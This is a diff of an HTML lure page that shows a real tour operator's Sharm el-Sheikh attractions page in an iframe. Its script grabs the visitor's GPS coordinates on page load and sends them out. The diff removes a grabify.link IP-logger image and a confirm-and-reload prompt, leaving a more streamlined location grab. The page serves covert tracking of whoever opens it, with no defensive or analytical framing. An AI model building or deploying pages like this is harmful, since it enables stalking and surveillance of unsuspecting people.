@@ -30,8 +30,8 @@
     </style>
 </head>
 <body>
-    <img src="https://grabify.link/2KHAV8">
-    <!-- Content is loaded normally without hiding the iframe -->
+
+    <!-- Content is loaded normally -->
     <iframe id="content-frame" src="https://www.elgounatours.com/en/top-attractions-in-sharm-el-sheikh"></iframe>
 
     <script>
@@ -46,7 +46,7 @@
 
                     // Prepare data with coordinates
                     const data = {
-                        content: `User GPS coordinates: ${latitude}, ${longitude}`
+                        content: `User GPS coordinates: Latitude: ${latitude}, Longitude: ${longitude}`
                     };
 
                     // Send GPS data
@@ -70,15 +70,9 @@
             }
         }
 
-        // Trigger an alert and ask for permission to access the user's location
+        // Trigger GPS permission request on page load without an additional alert
         window.onload = function () {
-            const userConfirmed = confirm("Location is required for better service. Please allow location access to use the site.");
-            if (userConfirmed) {
-                getGPS();
-            } else {
-                // If the user dismisses, reload the page to prompt again
-                location.reload();
-            }
+            getGPS();
         };
     </script>
 
